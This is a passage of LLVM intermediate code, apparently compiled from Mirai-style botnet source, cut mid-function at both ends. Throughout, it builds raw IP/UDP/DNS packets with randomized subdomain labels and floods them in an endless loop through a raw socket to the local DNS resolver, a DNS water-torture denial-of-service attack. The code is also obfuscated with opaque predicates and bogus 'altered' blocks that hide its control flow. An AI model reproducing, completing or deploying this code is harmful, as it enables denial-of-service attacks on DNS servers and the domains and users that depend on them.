  %74 = load i8, i8* %15, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 9, i32 65535)
  %77 = trunc i32 %76 to i16
  store i16 %77, i16* %26, align 2
  %78 = load i8, i8* %15, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 0, i32 12)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %27, align 1
  %82 = load i8, i8* %15, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %84 = call i8* @attack_get_opt_str(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 8, i8* null)
  store i8* %84, i8** %28, align 8
  %85 = call i32 @get_dns_resolver()
  store i32 %85, i32* %30, align 4
  %86 = load i8*, i8** %28, align 8
  %87 = icmp eq i8* %86, null
  %88 = load i32, i32* @x.37
  %89 = load i32, i32* @y.38
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %87, label %96, label %97

; <label>:96:                                     ; preds = %originalBBpart2
  br label %508

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.37
  %99 = load i32, i32* @y.38
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load i8*, i8** %28, align 8
  %107 = call i32 @util_strlen(i8* %106)
  store i32 %107, i32* %29, align 4
  %108 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %108, i32* %18, align 4
  %109 = icmp eq i32 %108, -1
  %110 = load i32, i32* @x.37
  %111 = load i32, i32* @y.38
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %109, label %118, label %119

; <label>:118:                                    ; preds = %originalBBpart24
  br label %508

; <label>:119:                                    ; preds = %originalBBpart24
  store i32 1, i32* %17, align 4
  %120 = load i32, i32* %18, align 4
  %121 = bitcast i32* %17 to i8*
  %122 = call i32 @setsockopt(i32 %120, i32 0, i32 3, i8* %121, i32 4) #6
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %127

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* %18, align 4
  %126 = call i32 @close(i32 %125)
  br label %508

; <label>:127:                                    ; preds = %119
  store i32 0, i32* %17, align 4
  br label %128

; <label>:128:                                    ; preds = %originalBBpart272, %127
  %129 = load i32, i32* %17, align 4
  %130 = load i8, i8* %13, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  br i1 %132, label %133, label %356

; <label>:133:                                    ; preds = %128
  store i8 0, i8* %32, align 1
  store i8 0, i8* %33, align 1
  %134 = call noalias i8* @calloc(i64 600, i64 1) #6
  %135 = load i8**, i8*** %19, align 8
  %136 = load i32, i32* %17, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %19, align 8
  %140 = load i32, i32* %17, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %34, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.udphdr*
  store %struct.udphdr* %147, %struct.udphdr** %35, align 8
  %148 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i64 1
  %150 = bitcast %struct.udphdr* %149 to %struct.dnshdr*
  store %struct.dnshdr* %150, %struct.dnshdr** %36, align 8
  %151 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %152 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %151, i64 1
  %153 = bitcast %struct.dnshdr* %152 to i8*
  store i8* %153, i8** %37, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, 15
  %158 = or i8 %157, 64
  store i8 %158, i8* %155, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = load i8, i8* %160, align 4
  %162 = and i8 %161, -16
  %163 = or i8 %162, 5
  store i8 %163, i8* %160, align 4
  %164 = load i8, i8* %20, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 1
  store i8 %164, i8* %166, align 1
  %167 = load i8, i8* %27, align 1
  %168 = zext i8 %167 to i64
  %169 = add i64 41, %168
  %170 = add i64 %169, 2
  %171 = load i32, i32* %29, align 4
  %172 = sext i32 %171 to i64
  %173 = add i64 %170, %172
  %174 = add i64 %173, 4
  %175 = trunc i64 %174 to i16
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 2
  store i16 %176, i16* %178, align 2
  %179 = load i16, i16* %21, align 2
  %180 = call zeroext i16 @htons(i16 zeroext %179) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i8, i8* %22, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 %183, i8* %185, align 4
  %186 = load i8, i8* %23, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

; <label>:188:                                    ; preds = %133
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %133
  %193 = load i32, i32* @x.37
  %194 = load i32, i32* @y.38
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %192
  %201 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 17, i8* %202, align 1
  %203 = load i32, i32* @LOCAL_ADDR, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load i32, i32* %30, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  store i32 %206, i32* %208, align 4
  %209 = load i16, i16* %24, align 2
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %212 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %211, i32 0, i32 0
  store i16 %210, i16* %212, align 2
  %213 = load i16, i16* %25, align 2
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 1
  store i16 %214, i16* %216, align 2
  %217 = load i8, i8* %27, align 1
  %218 = zext i8 %217 to i64
  %219 = add i64 21, %218
  %220 = add i64 %219, 2
  %221 = load i32, i32* %29, align 4
  %222 = sext i32 %221 to i64
  %223 = add i64 %220, %222
  %224 = add i64 %223, 4
  %225 = trunc i64 %224 to i16
  %226 = call zeroext i16 @htons(i16 zeroext %225) #7
  %227 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %228 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %227, i32 0, i32 2
  store i16 %226, i16* %228, align 2
  %229 = load i16, i16* %26, align 2
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %232 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %231, i32 0, i32 0
  store i16 %230, i16* %232, align 2
  %233 = call zeroext i16 @htons(i16 zeroext 256) #7
  %234 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %235 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %234, i32 0, i32 1
  store i16 %233, i16* %235, align 2
  %236 = call zeroext i16 @htons(i16 zeroext 1) #7
  %237 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %238 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %237, i32 0, i32 2
  store i16 %236, i16* %238, align 2
  %239 = load i8, i8* %27, align 1
  %240 = load i8*, i8** %37, align 8
  %241 = getelementptr inbounds i8, i8* %240, i32 1
  store i8* %241, i8** %37, align 8
  store i8 %239, i8* %240, align 1
  %242 = load i8, i8* %27, align 1
  %243 = zext i8 %242 to i32
  %244 = load i8*, i8** %37, align 8
  %245 = sext i32 %243 to i64
  %246 = getelementptr inbounds i8, i8* %244, i64 %245
  store i8* %246, i8** %37, align 8
  %247 = load i8*, i8** %37, align 8
  store i8* %247, i8** %38, align 8
  %248 = load i8*, i8** %37, align 8
  %249 = getelementptr inbounds i8, i8* %248, i64 1
  %250 = load i8*, i8** %28, align 8
  %251 = load i32, i32* %29, align 4
  %252 = add nsw i32 %251, 1
  call void @util_memcpy(i8* %249, i8* %250, i32 %252)
  store i32 0, i32* %31, align 4
  %253 = load i32, i32* @x.37
  %254 = load i32, i32* @y.38
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBBpart257, label %originalBB6alteredBB

originalBBpart257:                                ; preds = %originalBB6
  br label %261

; <label>:261:                                    ; preds = %303, %originalBBpart257
  %262 = load i32, i32* @x.37
  %263 = load i32, i32* @y.38
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %261
  %270 = load i32, i32* %31, align 4
  %271 = load i32, i32* %29, align 4
  %272 = icmp slt i32 %270, %271
  %273 = load i32, i32* @x.37
  %274 = load i32, i32* @y.38
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %272, label %281, label %306

; <label>:281:                                    ; preds = %originalBBpart261
  %282 = load i8*, i8** %28, align 8
  %283 = load i32, i32* %31, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8, i8* %282, i64 %284
  %286 = load i8, i8* %285, align 1
  %287 = sext i8 %286 to i32
  %288 = icmp eq i32 %287, 46
  br i1 %288, label %289, label %299

; <label>:289:                                    ; preds = %281
  %290 = load i8, i8* %32, align 1
  %291 = load i8*, i8** %38, align 8
  store i8 %290, i8* %291, align 1
  store i8 0, i8* %32, align 1
  %292 = load i8, i8* %33, align 1
  %293 = add i8 %292, 1
  store i8 %293, i8* %33, align 1
  %294 = load i8*, i8** %37, align 8
  %295 = load i32, i32* %31, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8, i8* %294, i64 %296
  %298 = getelementptr inbounds i8, i8* %297, i64 1
  store i8* %298, i8** %38, align 8
  br label %302

; <label>:299:                                    ; preds = %281
  %300 = load i8, i8* %32, align 1
  %301 = add i8 %300, 1
  store i8 %301, i8* %32, align 1
  br label %302

; <label>:302:                                    ; preds = %299, %289
  br label %303

; <label>:303:                                    ; preds = %302
  %304 = load i32, i32* %31, align 4
  %305 = add nsw i32 %304, 1
  store i32 %305, i32* %31, align 4
  br label %261

; <label>:306:                                    ; preds = %originalBBpart261
  %307 = load i32, i32* @x.37
  %308 = load i32, i32* @y.38
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %306
  %315 = load i8, i8* %32, align 1
  %316 = load i8*, i8** %38, align 8
  store i8 %315, i8* %316, align 1
  %317 = load i8*, i8** %37, align 8
  %318 = load i32, i32* %29, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  %322 = bitcast i8* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %39, align 8
  %323 = call zeroext i16 @htons(i16 zeroext 1) #7
  %324 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %325 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 1
  store i16 %326, i16* %328, align 2
  %329 = load i32, i32* @x.37
  %330 = load i32, i32* @y.38
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %337

; <label>:337:                                    ; preds = %originalBBpart265
  %338 = load i32, i32* @x.37
  %339 = load i32, i32* @y.38
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %337
  %346 = load i32, i32* %17, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %17, align 4
  %348 = load i32, i32* @x.37
  %349 = load i32, i32* @y.38
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart272, label %originalBB67alteredBB

originalBBpart272:                                ; preds = %originalBB67
  br label %128

; <label>:356:                                    ; preds = %128
  br label %357

; <label>:357:                                    ; preds = %507, %356
  store i32 0, i32* %17, align 4
  br label %358

; <label>:358:                                    ; preds = %504, %357
  %359 = load i32, i32* %17, align 4
  %360 = load i8, i8* %13, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp slt i32 %359, %361
  br i1 %362, label %363, label %507

; <label>:363:                                    ; preds = %358
  %364 = load i8**, i8*** %19, align 8
  %365 = load i32, i32* %17, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds i8*, i8** %364, i64 %366
  %368 = load i8*, i8** %367, align 8
  store i8* %368, i8** %40, align 8
  %369 = load i8*, i8** %40, align 8
  %370 = bitcast i8* %369 to %struct.iphdr*
  store %struct.iphdr* %370, %struct.iphdr** %41, align 8
  %371 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i64 1
  %373 = bitcast %struct.iphdr* %372 to %struct.udphdr*
  store %struct.udphdr* %373, %struct.udphdr** %42, align 8
  %374 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %375 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %374, i64 1
  %376 = bitcast %struct.udphdr* %375 to %struct.dnshdr*
  store %struct.dnshdr* %376, %struct.dnshdr** %43, align 8
  %377 = load %struct.dnshdr*, %struct.dnshdr** %43, align 8
  %378 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %377, i64 1
  %379 = bitcast %struct.dnshdr* %378 to i8*
  %380 = getelementptr inbounds i8, i8* %379, i64 1
  store i8* %380, i8** %44, align 8
  %381 = load i16, i16* %21, align 2
  %382 = zext i16 %381 to i32
  %383 = icmp eq i32 %382, 65535
  br i1 %383, label %384, label %390

; <label>:384:                                    ; preds = %363
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 3
  store i16 %387, i16* %389, align 4
  br label %390

; <label>:390:                                    ; preds = %384, %363
  %391 = load i16, i16* %24, align 2
  %392 = zext i16 %391 to i32
  %393 = icmp eq i32 %392, 65535
  br i1 %393, label %394, label %400

; <label>:394:                                    ; preds = %390
  %395 = call i32 @rand_next()
  %396 = and i32 %395, 65535
  %397 = trunc i32 %396 to i16
  %398 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %399 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %398, i32 0, i32 0
  store i16 %397, i16* %399, align 2
  br label %400

; <label>:400:                                    ; preds = %394, %390
  %401 = load i32, i32* @x.37
  %402 = load i32, i32* @y.38
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %400
  %409 = load i16, i16* %25, align 2
  %410 = zext i16 %409 to i32
  %411 = icmp eq i32 %410, 65535
  %412 = load i32, i32* @x.37
  %413 = load i32, i32* @y.38
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %411, label %420, label %426

; <label>:420:                                    ; preds = %originalBBpart276
  %421 = call i32 @rand_next()
  %422 = and i32 %421, 65535
  %423 = trunc i32 %422 to i16
  %424 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %425 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %424, i32 0, i32 1
  store i16 %423, i16* %425, align 2
  br label %426

; <label>:426:                                    ; preds = %420, %originalBBpart276
  %427 = load i16, i16* %26, align 2
  %428 = zext i16 %427 to i32
  %429 = icmp eq i32 %428, 65535
  br i1 %429, label %430, label %436

; <label>:430:                                    ; preds = %426
  %431 = call i32 @rand_next()
  %432 = and i32 %431, 65535
  %433 = trunc i32 %432 to i16
  %434 = load %struct.dnshdr*, %struct.dnshdr** %43, align 8
  %435 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %434, i32 0, i32 0
  store i16 %433, i16* %435, align 2
  br label %436

; <label>:436:                                    ; preds = %430, %426
  %437 = load i8*, i8** %44, align 8
  %438 = load i8, i8* %27, align 1
  %439 = zext i8 %438 to i32
  call void @rand_alpha_str(i8* %437, i32 %439)
  %440 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 7
  store i16 0, i16* %441, align 2
  %442 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %443 = bitcast %struct.iphdr* %442 to i16*
  %444 = call zeroext i16 @checksum_generic(i16* %443, i32 20)
  %445 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 7
  store i16 %444, i16* %446, align 2
  %447 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %448 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %447, i32 0, i32 3
  store i16 0, i16* %448, align 2
  %449 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %450 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %451 = bitcast %struct.udphdr* %450 to i8*
  %452 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %453 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %452, i32 0, i32 2
  %454 = load i16, i16* %453, align 2
  %455 = load i8, i8* %27, align 1
  %456 = zext i8 %455 to i64
  %457 = add i64 21, %456
  %458 = add i64 %457, 2
  %459 = load i32, i32* %29, align 4
  %460 = sext i32 %459 to i64
  %461 = add i64 %458, %460
  %462 = add i64 %461, 4
  %463 = trunc i64 %462 to i32
  %464 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %449, i8* %451, i16 zeroext %454, i32 %463)
  %465 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %466 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %465, i32 0, i32 3
  store i16 %464, i16* %466, align 2
  %467 = load i32, i32* %30, align 4
  %468 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %469 = load i32, i32* %17, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %468, i64 %470
  %472 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %471, i32 0, i32 0
  %473 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %472, i32 0, i32 2
  %474 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %473, i32 0, i32 0
  store i32 %467, i32* %474, align 4
  %475 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 1
  %477 = load i16, i16* %476, align 2
  %478 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %479 = load i32, i32* %17, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %478, i64 %480
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i32 0, i32 0
  %483 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %482, i32 0, i32 1
  store i16 %477, i16* %483, align 2
  %484 = load i32, i32* %18, align 4
  %485 = load i8*, i8** %40, align 8
  %486 = load i8, i8* %27, align 1
  %487 = zext i8 %486 to i64
  %488 = add i64 41, %487
  %489 = add i64 %488, 2
  %490 = load i32, i32* %29, align 4
  %491 = sext i32 %490 to i64
  %492 = add i64 %489, %491
  %493 = add i64 %492, 4
  %494 = bitcast %union.__CONST_SOCKADDR_ARG* %45 to %struct.sockaddr**
  %495 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %496 = load i32, i32* %17, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %495, i64 %497
  %499 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %498, i32 0, i32 0
  %500 = bitcast %struct.sockaddr_in* %499 to %struct.sockaddr*
  store %struct.sockaddr* %500, %struct.sockaddr** %494, align 8
  %501 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %45, i32 0, i32 0
  %502 = load %struct.sockaddr*, %struct.sockaddr** %501, align 8
  %503 = call i64 @sendto(i32 %484, i8* %485, i64 %493, i32 16384, %struct.sockaddr* %502, i32 16)
  br label %504

; <label>:504:                                    ; preds = %436
  %505 = load i32, i32* %17, align 4
  %506 = add nsw i32 %505, 1
  store i32 %506, i32* %17, align 4
  br label %358

; <label>:507:                                    ; preds = %358
  br label %357

; <label>:508:                                    ; preds = %124, %118, %96
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %509 = alloca i8, align 1
  %510 = alloca %struct.attack_target*, align 8
  %511 = alloca i8, align 1
  %512 = alloca %struct.attack_option*, align 8
  %513 = alloca i32, align 4
  %514 = alloca i32, align 4
  %515 = alloca i8**, align 8
  %516 = alloca i8, align 1
  %517 = alloca i16, align 2
  %518 = alloca i8, align 1
  %519 = alloca i8, align 1
  %520 = alloca i16, align 2
  %521 = alloca i16, align 2
  %522 = alloca i16, align 2
  %523 = alloca i8, align 1
  %524 = alloca i8*, align 8
  %525 = alloca i32, align 4
  %526 = alloca i32, align 4
  %527 = alloca i32, align 4
  %528 = alloca i8, align 1
  %529 = alloca i8, align 1
  %530 = alloca %struct.iphdr*, align 8
  %531 = alloca %struct.udphdr*, align 8
  %532 = alloca %struct.dnshdr*, align 8
  %533 = alloca i8*, align 8
  %534 = alloca i8*, align 8
  %535 = alloca %struct.grehdr*, align 8
  %536 = alloca i8*, align 8
  %537 = alloca %struct.iphdr*, align 8
  %538 = alloca %struct.udphdr*, align 8
  %539 = alloca %struct.dnshdr*, align 8
  %540 = alloca i8*, align 8
  %541 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %509, align 1
  store %struct.attack_target* %1, %struct.attack_target** %510, align 8
  store i8 %2, i8* %511, align 1
  store %struct.attack_option* %3, %struct.attack_option** %512, align 8
  %542 = load i8, i8* %509, align 1
  %543 = zext i8 %542 to i64
  %544 = call noalias i8* @calloc(i64 %543, i64 8) #6
  %545 = bitcast i8* %544 to i8**
  store i8** %545, i8*** %515, align 8
  %546 = load i8, i8* %511, align 1
  %547 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %548 = call i32 @attack_get_opt_int(i8 zeroext %546, %struct.attack_option* %547, i8 zeroext 2, i32 0)
  %549 = trunc i32 %548 to i8
  store i8 %549, i8* %516, align 1
  %550 = load i8, i8* %511, align 1
  %551 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %552 = call i32 @attack_get_opt_int(i8 zeroext %550, %struct.attack_option* %551, i8 zeroext 3, i32 65535)
  %553 = trunc i32 %552 to i16
  store i16 %553, i16* %517, align 2
  %554 = load i8, i8* %511, align 1
  %555 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %556 = call i32 @attack_get_opt_int(i8 zeroext %554, %struct.attack_option* %555, i8 zeroext 4, i32 64)
  %557 = trunc i32 %556 to i8
  store i8 %557, i8* %518, align 1
  %558 = load i8, i8* %511, align 1
  %559 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %560 = call i32 @attack_get_opt_int(i8 zeroext %558, %struct.attack_option* %559, i8 zeroext 5, i32 0)
  %561 = trunc i32 %560 to i8
  store i8 %561, i8* %519, align 1
  %562 = load i8, i8* %511, align 1
  %563 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %564 = call i32 @attack_get_opt_int(i8 zeroext %562, %struct.attack_option* %563, i8 zeroext 6, i32 65535)
  %565 = trunc i32 %564 to i16
  store i16 %565, i16* %520, align 2
  %566 = load i8, i8* %511, align 1
  %567 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %568 = call i32 @attack_get_opt_int(i8 zeroext %566, %struct.attack_option* %567, i8 zeroext 7, i32 53)
  %569 = trunc i32 %568 to i16
  store i16 %569, i16* %521, align 2
  %570 = load i8, i8* %511, align 1
  %571 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %572 = call i32 @attack_get_opt_int(i8 zeroext %570, %struct.attack_option* %571, i8 zeroext 9, i32 65535)
  %573 = trunc i32 %572 to i16
  store i16 %573, i16* %522, align 2
  %574 = load i8, i8* %511, align 1
  %575 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %576 = call i32 @attack_get_opt_int(i8 zeroext %574, %struct.attack_option* %575, i8 zeroext 0, i32 12)
  %577 = trunc i32 %576 to i8
  store i8 %577, i8* %523, align 1
  %578 = load i8, i8* %511, align 1
  %579 = load %struct.attack_option*, %struct.attack_option** %512, align 8
  %580 = call i8* @attack_get_opt_str(i8 zeroext %578, %struct.attack_option* %579, i8 zeroext 8, i8* null)
  store i8* %580, i8** %524, align 8
  %581 = call i32 @get_dns_resolver()
  store i32 %581, i32* %526, align 4
  %582 = load i8*, i8** %524, align 8
  %583 = icmp eq i8* %582, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  %584 = load i8*, i8** %28, align 8
  %585 = call i32 @util_strlen(i8* %584)
  store i32 %585, i32* %29, align 4
  %586 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %586, i32* %18, align 4
